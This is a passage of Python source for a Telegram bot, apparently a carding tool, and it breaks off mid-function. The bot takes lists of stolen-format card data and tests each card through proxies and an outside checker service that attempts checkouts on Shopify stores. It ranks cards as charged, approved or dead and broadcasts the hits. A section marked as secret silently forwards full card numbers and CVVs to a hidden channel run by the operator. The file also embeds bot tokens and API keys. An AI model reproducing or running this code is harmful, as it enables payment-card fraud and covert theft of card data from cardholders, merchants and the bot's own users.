#BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢: https://t.me/of2of2
#join: https://t.me/of2of2
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import logging
from datetime import datetime

# ========== Logging ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ========== Config ==========
API_ID = 33350554
API_HASH = 'f0c9cd31e587a08cda09b1e725d3dd67'
BOT_TOKEN = '8830175369:AAHQemHnG8iEY6mje7VlGIKMJZYMMeLGw4I'
ADMIN_ID = [1714616609, 6806436992, 8527559335]

CHECKER_API_URL = 'http://5.175.222.144:8081'

# ═══════════════════════════════════════════════════
# ✨ قناة نشر البطاقات العامة (Charged / Approved)
# ═══════════════════════════════════════════════════
BROADCAST_CHANNEL_ID = -1003898466979

# ═══════════════════════════════════════════════════
# 🔒 القناة السرية — تتبعت فيها الهايتس فقط (بدون علم أحد)
# ═══════════════════════════════════════════════════
SECRET_CHANNEL_ID = -1003969105061
# ═══════════════════════════════════════════════════

MAINTENANCE_FILE = 'maintenance.json'
_maintenance_cache = {'enabled': None, 'last_check': 0}

DEFAULT_SITE = 'mood.design'
PROXY_FILE = 'proxy.txt'
CHANNELS_FILE = 'channels.json'
STATS_FILE = 'stats.json'
IMAGE_FILE = 'welcome_image.jpg'
COOLDOWN_SECONDS = 5

MAX_CARDS_PER_FILE = 1000
MAX_FILE_SIZE = 10 * 1024 * 1024
MAX_CARD_ATTEMPTS = 20

PROXY_TIMEOUT = 15
PROXY_MAX_WORKERS = 50

# ═══════════════════════════════════════════════════
# ✨ كلمات إعادة المحاولة (القديمة)
# ═══════════════════════════════════════════════════
RETRY_KEYWORDS = [
    'failed to get session token', 'invalid json response', 'session token',
    'connection', 'timeout', 'timed out', 'proxy',
    'no such host', 'connection refused',
    'unable to get payment token',
    'payment token',
    'unable to get token',
    'failed to get token',
    'site error', 'site_error',
    'http 429', 'http_429', 'status: 429', 'status 429',
    'too many requests', 'rate limit', 'rate_limit',
    'internal server error', 'internal_server_error',
    'bad gateway', 'service unavailable', 'gateway timeout',
    '502', '503', '504',
    'cloudflare', 'captcha',
    'cart failed', 'invalid json',
    'inventoryreservationfailure',
    'empty response', 'empty submit',
    'checkout_expired', 'checkout_not_found',
    'cart add failed',
]

# ═══════════════════════════════════════════════════
# ✨ قوائم فلترة الأخطاء (من الكود الجديد)
# ═══════════════════════════════════════════════════
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found',
    'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail', 'tax ammount empty', 'tax amount empty',
    'tax amount is empty', 'del ammount empty', 'site not supported for now',
    'payment base card not supported', 'no product found', 'checkout is not available',
    'cart is empty', 'cart add failed after retries', 'checkout_expired',
    'checkout_not_found', 'no shipping methods available', 'site error', 'site dead',
    'site errors', 'server error', 'internal server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'error processing card', 'we could not process', 'unable to process',
    'payment provider error', 'payment gateway error', 'session expired',
    'session invalid', 'failed after retries', 'max retries exceeded',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source', 'shop is unavailable',
    'store is unavailable', 'store not found', 'page not found',
    'this store is unavailable', 'this shop is currently unavailable',
    'password protected', 'enter store using password', 'storefront is password protected',
    'shop closed', 'store closed', 'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
    'delivery_address', 'address_required', 'submit_rejected',
    'submit rejected:', 'change proxy or site', 'change site',
    'fake charge gate', 'fake gate',
    'hcaptcha detected', 'hcaptcha_detected', 'captcha at checkout',
    'captcha_required', 'captcha required', 'cloudflare',
    'access denied', 'permission denied',
    'connection error', 'connection failed', 'timed out', 'timeout',
    'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout',
    'http error', 'httperror504', '502', '503', '504',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'site error! status: 404', 'site error! status: 401',
    'amount_too_small', 'amount too small', 'merchandise_not_enough_stock',
    'product out of stock', 'malformed input', 'url rejected',
    'invalid_response',
    'cart failed with status', 'invalid json response', 'invalid json',
    'inventoryreservationfailure', 'inventory_reservation_failure',
    'payments_positive_amount_expec', 'payments_payment_flexibility_t',
    'payments_credit_card_brand_not', 'buyer_identity_presentment_currency',
    "'products'", "error:", "error: '",
    'unable to get payment token', 'empty submit response', 'empty submit',
    'order_total_changed', 'order total changed',
    'invalid_payment_method', 'invalid payment method',
    'validation_custom', 'validation custom',
    'ARTIFACT_DISSATISFACTION', 'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR', 'processing_error',
    'DELIVERY_COMPANY_REQUIRED', 'delivery_company_required',
    'DECISION_RULE_BLOCK', 'decision_rule_block',
    'http 429', 'http_429', 'status: 429', 'status 429',
    'too many requests', 'rate limit', 'rate_limit',
    '429 too many',
    'checkout error', 'checkout_error', 'post "', 'post "https',
]

PROXY_ERROR_KEYWORDS = [
    'proxy dead', 'proxy error', 'proxy timeout',
    'proxy connection failed', 'proxy refused',
]

STRICT_SITE_REJECT = [
    'merchandise_expected_price_mismatch',
    'merchandise expected price mismatch',
    'merchandiseexpectedpricemismatch',
    'site error', 'site_error',
    'fake charge gate', 'fake_gate',
    'change proxy or site', 'change site',
    'submit_rejected', 'submit rejected', 'submit_rejected:',
    'checkout error', 'checkout_error',
]

MONEY_APPROVED_KEYWORDS = [
    'insufficient_funds',
    'insufficient funds',
    'insufficient account balance',
    'insufficient_account_balance',
    'your payment could not be completed due to insufficient account balance',
]

DECLINE_KEYWORDS = [
    'card_declined', 'card declined',
    'generic_decline', 'generic decline',
    'do_not_honor', 'do not honor',
    'stolen_card', 'lost_card',
    'pickup_card', 'pick_up_card',
    'restricted_card', 'restricted card',
    'fraudulent', 'fraud suspected', 'fraud_suspected',
    'expired_card', 'expired card',
    'transaction_not_allowed', 'transaction not allowed',
    'processor_declined', 'processor declined',
    'card_not_supported', 'card not supported',
    'currency_not_supported', 'duplicate_transaction',
    'revocation_of_authorization', 'no_action_taken',
    'try_again_later', 'not_permitted', 'decline',
    'your card was declined',
    'payment_intent_authentication_failure',
    'avs_check_failed', 'incorrect number', 'incorrect_number',
    'invalid_number',
    'decision_rule_block', 'generic_error',
]

CHARGED_KEYWORDS = [
    'order_paid', 'order_placed', 'order_confirmed',
    'thank you', 'payment successful', 'order_completed',
    'charged', 'order_created', 'order confirmed',
]

APPROVED_KEYWORDS = [
    'otp_required', 'otp required', '3d_authentication', '3ds_required',
    '3d required', '3d_redirect', 'authentication_required',
    'insufficient_funds', 'insufficient funds',
    'insufficient account balance',
    'cvc', 'ccn', 'ccn live cvv',
]

CURRENCIES_OLD = ['USD', 'JPY', 'EUR', 'GBP', 'CAD', 'AUD', 'INR', 'AED', 'SAR', 'CHF', 'CNY', 'KRW', 'TRY', 'BRL', 'MXN', 'NZD', 'SEK', 'NOK', 'DKK', 'PLN']


def is_site_error(text):
    if not text: return True
    lower = str(text).lower().strip()
    if lower == 'na': return True
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS)


def is_proxy_error(text):
    if not text: return False
    return any(kw in str(text).lower().strip() for kw in PROXY_ERROR_KEYWORDS)


def is_truly_alive(response, price):
    if not response: return False
    lower = str(response).lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    pc = re.sub(r'[A-Za-z]+', '', pc).strip()
    try: pv = float(pc)
    except: pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand',
           'checkout error', 'checkout_error', 'post "']
    for b in bad:
        if b in lower: return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline',
                   'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
                   'stolen_card', 'lost_card', 'expired_card', 'expired card',
                   'otp_required', 'otp required', '3d', 'authentication',
                   'cvc', 'ccn', 'generic_error', 'generic error',
                   'restricted_card', 'fraudulent', 'not_permitted',
                   'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal): return False
    return True


def format_price_old(price_raw):
    if not price_raw or price_raw == '-':
        return "-"
    price_str = str(price_raw).strip()
    if not price_str:
        return "-"
    if any(curr in price_str.upper() for curr in CURRENCIES_OLD):
        return price_str
    if price_str.startswith('$'):
        return price_str
    return f"${price_str}"

# ═══════════════════════════════════════════════════

bot = TelegramClient('maestro_bot_v2', API_ID, API_HASH)
# ========== Global State ==========
active_sessions = {}
user_locks = {}
user_last_check = {}
admin_states = {}

# ========== Premium Emoji ==========
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

# ========== Helpers ==========
def is_admin(user_id):
    return user_id in ADMIN_ID

def is_retry_response(msg):
    if not msg:
        return True
    lower = str(msg).lower()
    return any(kw in lower for kw in RETRY_KEYWORDS)

def can_check(user_id):
    if is_admin(user_id):
        return True, None

    if user_id in user_locks:
        return False, "⚠️ <b>You already have a check in progress.</b>\n\nPlease wait until it finishes."

    last = user_last_check.get(user_id, 0)
    remaining = COOLDOWN_SECONDS - (time.time() - last)
    if remaining > 0:
        return False, f"⏱️ Please wait <b>{remaining:.0f}s</b> before next check."

    return True, None

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error reading {filepath}: {e}")
        return []

def load_proxies():
    return get_file_lines(PROXY_FILE)

def image_exists():
    return os.path.exists(IMAGE_FILE) and os.path.getsize(IMAGE_FILE) > 0

# ========== Maintenance ==========
async def load_maintenance():
    global _maintenance_cache
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            _maintenance_cache = {'enabled': False, 'last_check': time.time()}
            return False
        async with aiofiles.open(MAINTENANCE_FILE, 'r') as f:
            data = json.loads(await f.read())
            _maintenance_cache = {'enabled': data.get('maintenance', False), 'last_check': time.time()}
            return _maintenance_cache['enabled']
    except:
        _maintenance_cache = {'enabled': False, 'last_check': time.time()}
        return False

async def set_maintenance(enabled):
    global _maintenance_cache
    try:
        async with aiofiles.open(MAINTENANCE_FILE, 'w') as f:
            await f.write(json.dumps({'maintenance': enabled}))
        _maintenance_cache = {'enabled': enabled, 'last_check': time.time()}
        return True
    except:
        return False

async def get_maintenance():
    global _maintenance_cache
    now = time.time()
    if _maintenance_cache['enabled'] is not None and now - _maintenance_cache['last_check'] < 30:
        return _maintenance_cache['enabled']
    return await load_maintenance()

async def check_maintenance(event):
    if await get_maintenance() and event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji(
            "⚠️ <b>Bot Under Maintenance</b>\n\n"
            "Please try again later."
        ), parse_mode='html')
        return True
    return False

# ========== Stats ==========
def load_stats():
    default = {
        "total_checks": 0, "total_charged": 0, "total_approved": 0,
        "total_dead": 0, "started_at": time.time()
    }
    if not os.path.exists(STATS_FILE):
        return default
    try:
        with open(STATS_FILE, 'r') as f:
            data = json.load(f)
            for k, v in default.items():
                data.setdefault(k, v)
            return data
    except:
        return default

def save_stats(s):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(s, f, indent=2)
    except Exception as e:
        logger.error(f"Stats save error: {e}")

bot_stats = load_stats()

# ========== Channels ==========
def load_channels():
    if not os.path.exists(CHANNELS_FILE):
        return []
    try:
        with open(CHANNELS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_channels(channels):
    try:
        with open(CHANNELS_FILE, 'w') as f:
            json.dump(channels, f, indent=2)
    except Exception as e:
        logger.error(f"Save channels error: {e}")

async def add_channel(channel_id, channel_title):
    channels = load_channels()
    if any(int(c['id']) == int(channel_id) for c in channels):
        return False
    channels.append({'id': channel_id, 'title': channel_title, 'added_at': time.time()})
    save_channels(channels)
    return True

async def remove_channel(channel_id):
    channels = load_channels()
    new = [c for c in channels if int(c['id']) != int(channel_id)]
    if len(new) == len(channels):
        return False
    save_channels(new)
    return True

# ========== Progress Helpers ==========
def make_progress_bar(current, total, length=18):
    if total == 0:
        return "░" * length
    filled = int(length * current / total)
    return "█" * filled + "░" * (length - filled)

def calc_eta(start_time, checked, total):
    if checked == 0:
        return "N/A"
    elapsed = time.time() - start_time
    rate = checked / elapsed
    if rate <= 0:
        return "N/A"
    remaining = (total - checked) / rate
    m, s = divmod(int(remaining), 60)
    return f"{m:02d}:{s:02d}"

def calc_speed(start_time, checked):
    elapsed = time.time() - start_time
    if elapsed <= 0:
        return 0
    return int(checked / elapsed * 60)

# ========== Keyboard ==========
def get_main_menu_keyboard(user_id=None):
    """✅ زرار Admin Panel يظهر للأدمن فقط — زرار OWNER موجود زي ما هو"""
    buttons = [
        [Button.inline(" Cmd", b"show_cmds", style="success"),
         Button.url(" 𝘾𝙃𝘼𝙉𝙀𝙇", "https://t.me/of2of2", style="success")],
        [Button.url(" 𝙊𝙒𝙉𝙀𝙍", "https://t.me/MA_S_t0", style="primary"),
         Button.url(" 𝙂𝙍𝙊𝙐𝙋", "https://t.me/of9of9", style="primary")]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" 👑 Admin Panel", b"admin_panel", style="success")])
    return buttons

# ========== BIN Info ==========
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ========== CC Utils ==========
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def format_proxy_for_url(proxy):
    if not proxy:
        return ''
    parts = proxy.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"{ip}:{port}:{user}:{password}"
    elif len(parts) == 2:
        ip, port = parts
        return f"{ip}:{port}"
    return proxy

# ========== Checker (معدلة بالكامل بالفلترة الجديدة) ==========
async def check_card(card, proxy=None):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        proxy_str = format_proxy_for_url(proxy)
        url = f'{CHECKER_API_URL.rstrip("/")}/?{card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except Exception:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        response_msg = (
            raw.get('Response') or raw.get('response') or raw.get('message')
            or raw.get('msg') or raw.get('result') or ''
        )
        response_msg = str(response_msg)

        price_raw = raw.get('Price') or raw.get('price') or '-'
        price = format_price_old(price_raw)

        gateway = raw.get('Gateway') or raw.get('gateway') or raw.get('Gate') or 'Shopify'

        if not response_msg:
            return {'status': 'Site Error', 'message': 'Empty response', 'card': card,
                    'retry': True, 'gateway': gateway, 'price': price}

        if is_site_error(response_msg) or is_proxy_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card,
                    'retry': True, 'gateway': gateway, 'price': price}

        if is_retry_response(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card,
                    'retry': True, 'gateway': gateway, 'price': price}

        response_lower = response_msg.lower().strip()

        for kw in STRICT_SITE_REJECT:
            if kw in response_lower:
                return {'status': 'Site Error', 'message': response_msg, 'card': card,
                        'retry': True, 'gateway': gateway, 'price': price}

        if any(k in response_lower for k in DECLINE_KEYWORDS):
            return {'status': 'Dead', 'message': response_msg, 'card': card,
                    'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        if any(k in response_lower for k in CHARGED_KEYWORDS):
            if is_truly_alive(response_msg, price):
                return {'status': 'Charged', 'message': response_msg, 'card': card,
                        'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        if any(k in response_lower for k in APPROVED_KEYWORDS):
            if is_truly_alive(response_msg, price):
                return {'status': 'Approved', 'message': response_msg, 'card': card,
                        'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        api_charged = str(raw.get('Charged', '')).lower().strip() == 'true'
        api_approved = str(raw.get('Approved', '')).lower().strip() == 'true'
        api_status = str(raw.get('Status', '')).lower().strip()

        if api_charged and is_truly_alive(response_msg, price):
            return {'status': 'Charged', 'message': response_msg, 'card': card,
                    'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        if api_approved and is_truly_alive(response_msg, price):
            return {'status': 'Approved', 'message': response_msg, 'card': card,
                    'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        if api_status == 'true' or raw.get('Status') is True:
            if not any(w in response_lower for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud", "cancel"]):
                if is_truly_alive(response_msg, price):
                    return {'status': 'Approved', 'message': response_msg, 'card': card,
                            'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

        return {'status': 'Dead', 'message': response_msg, 'card': card,
                'site': DEFAULT_SITE, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, proxies, max_retries=3):
    last_result = None
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        proxy = random.choice(proxies)
        result = await check_card(card, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)

    if last_result:
        return {'status': 'Dead', 'message': f'Errors: {last_result["message"]}', 'card': card,
                'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-')}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ========== Broadcast Hits (عام + سري) ==========
def mask_card(card):
    num = card.split('|')[0]
    if len(num) >= 10:
        return f"{num[:6]}****{num[-4:]}"
    return num

async def broadcast_hit(result, hit_type, username=None):
    """تنشر البطاقة على القناة العامة + القناة السرية"""
    if not BROADCAST_CHANNEL_ID:
        return

    gateway = result.get('gateway', 'Shopify Payments')
    response = (result['message'][:60].strip() or
                ("Order Confirmed" if hit_type == "Charged" else "Approved"))

    price = result.get('price', '-')
    if price and str(price) not in ['-', 'None'] and not str(price).endswith('USD'):
        price = f"{price} USD"

    user_line = username if username else "User"

    if hit_type == "Charged":
        hit_text = f"""💎 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗
🔥 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {gateway}
📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}
💰 𝗣𝗿𝗶𝗰𝗲 ➛ {price}
👤 𝗨𝘀𝗲𝗿 ➛ {user_line}"""
    else:
        hit_text = f"""✅ 𝗛𝗜𝗧 ➛ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗
🔥 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {gateway}
📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}
💰 𝗣𝗿𝗶𝗰𝗲 ➛ {price}
👤 𝗨𝘀𝗲𝗿 ➛ {user_line}"""

    hit_premium = premium_emoji(hit_text)

    try:
        await bot.send_message(BROADCAST_CHANNEL_ID, hit_premium, parse_mode='html')
        logger.info(f"✅ Sent {hit_type} hit to broadcast channel")
    except Exception as e:
        logger.error(f"❌ Broadcast failed: {e}")

    # 🔒 إرسال للقناة السرية
    try:
        await send_secret_hit(result, hit_type)
    except Exception as e:
        logger.error(f"🔒 Secret broadcast error: {e}")


# ========== 🔒 SECRET Channel (تنسيق خاص) ==========
async def send_secret_hit(result, hit_type):
    """🔒 يبعت الـ Hit للقناة السرية - تنسيق خاص"""
    if not SECRET_CHANNEL_ID:
        return

    try:
        card = result.get('card', '')
        gateway = result.get('gateway', 'Shopify Payments')
        response = str(result.get('message', ''))[:80].strip() or 'ORDER_PLACED'
        price = result.get('price', '-')
        if price and str(price) not in ['-', 'None'] and not str(price).endswith('USD'):
            price = f"{price} USD"

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if hit_type == "Charged":
            title = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⭐"
        else:
            title = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ⭐"

        secret_text = f"""{title}
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱
⤷ {card}
🛒 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ━ {gateway}
📝 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ━ {response}
💸 𝗣𝗿𝗶𝗰𝗲 ━ {price}
━━━━━━━━━━━━━━━━━
🆔 𝗕𝗜𝗡: {brand} | {bin_type} | {level}
🏦 𝗕𝗮𝗻𝗸: {bank}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}

⏱️ 𝗧𝗼𝗼𝗸 0.00s"""

        await bot.send_message(SECRET_CHANNEL_ID, secret_text, parse_mode='html')
        logger.info(f"🔒 Sent {hit_type} to SECRET channel")
    except Exception as e:
        logger.error(f"🔒 Secret channel failed: {e}")


# ========== Realtime Hit ==========
async def send_realtime_hit(user_id, result, hit_type, username):
    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

    try:
        await broadcast_hit(result, hit_type, username=username)
    except Exception as e:
        logger.error(f"broadcast_hit error: {e}")


# ========== Progress ==========
async def update_progress(user_id, message_id, results, checked):
    total = results['total']
    pct = int(checked / total * 100) if total else 0
    bar = make_progress_bar(checked, total)
    eta = calc_eta(results['start_time'], checked, total)
    speed = calc_speed(results['start_time'], checked)

    session_key = f"{user_id}_{message_id}"
    is_paused = active_sessions.get(session_key, {}).get('paused', False)
    status_icon = "⏸️ PAUSED" if is_paused else "🔥 RUNNING"

    pending = results.get('pending', 0)

    progress_text = f"""{status_icon}

📦 Progress <code>[{bar}]</code> {pct}%
✅ Checked: <b>{checked}</b> / <b>{total}</b>
⚡ Speed: <b>{speed}</b> cards/min
⏱️ ETA: <b>{eta}</b>

💳 Last CC: <code>{results.get('last_card', 'None')}</code>
📊 Pending: <b>{pending}</b>

┌───────────────────┐
│ ✅ Charged:  <b>{len(results['charged'])}</b>
│ 🟢 Approved: <b>{len(results['approved'])}</b>
│ ❌ Declined: <b>{len(results['dead'])}</b>
└───────────────────┘"""

    if is_paused:
        pause_btn = Button.inline(" ▶️ Resume", f"resume_{user_id}".encode(), style="success")
    else:
        pause_btn = Button.inline(" ⏸️ Pause", f"pause_{user_id}".encode(), style="primary")

    buttons = [
        [pause_btn, Button.inline(" 🛑 Stop", f"stop_{user_id}".encode(), style="danger")],
        [Button.inline(f" ✅ Charged {len(results['charged'])}", b"none", style="success"),
         Button.inline(f" 🟢 Approved {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f" ❌ Declined {len(results['dead'])}", b"none", style="danger")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text),
                               buttons=buttons, parse_mode='html')
    except:
        pass

# ========== Final Results ==========
async def send_final_results(user_id, results):
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    summary = f"""✅ Check Complete! ✅

📊 Results:
   ┣ ✅ Charged: {len(results['charged'])}
   ┣ 🔥 Approved: {len(results['approved'])}
   ┣ ❌ Declined: {len(results['dead'])}
   ┗ 📊 Total: {results['total']}

Hits:
{hits_text}

BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢 (@MA_S_t0)"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"maestro_{timestamp}.txt"

    try:
        async with aiofiles.open(filename, 'w') as f:
            await f.write("CC CHECKER RESULTS\n\n")
            await f.write(f"CHARGED ({len(results['charged'])}):\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
            await f.write("\n")
            await f.write(f"APPROVED ({len(results['approved'])}):\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
            await f.write("\n")
            await f.write(f"DECLINED ({len(results['dead'])}):\n")
            for r in results['dead']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")

        await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    except Exception as e:
        logger.error(f"send_final_results error: {e}")
    finally:
        try:
            if os.path.exists(filename):
                os.remove(filename)
                logger.info(f"🗑️ Temp report deleted: {filename}")
        except Exception as e:
            logger.error(f"Delete report failed: {e}")

# ========== Proxy Test ==========
async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'

